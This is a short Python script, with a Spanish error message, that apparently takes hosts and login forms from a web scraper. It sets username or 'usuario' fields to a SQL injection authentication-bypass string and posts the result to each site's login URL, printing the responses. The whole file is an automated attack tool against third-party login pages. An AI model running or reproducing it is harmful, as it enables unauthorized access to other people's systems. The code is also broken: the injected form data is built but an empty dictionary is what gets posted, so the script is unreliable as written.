import sqlite3
import requests
from web_scraping import getHostsLinks


def injectSQL():
    hostANV = getHostsLinks()

    for host, action_names_values in hostANV.items():
        for item in action_names_values:
            payload = {}
            link = ''

            if isinstance(item, dict):
                for name in item['names_values'].keys():
                    if any(p_name in name for p_name in ['user', 'usuario']):
                        item['names_values'][name] = "' or 'a'='a 'or'"
                        data = item['names_values']
                        link = item['action']
            elif isinstance(item, str):
                data={'usuario':"' or 'a'='a 'or'", 'password':''}
                link = item

            url = f'http://{host}/{link}/'

            try:
                with requests.Session() as s:
                    response = s.post(url, data=payload)
            except:
                print(f'Hubo un problema al tratar de logearse {url}')
                continue

            if response.status_code == requests.codes.ok:
                print(response.text)
            else:
                print(response.text)


if __name__ == '__main__':
    injectSQL()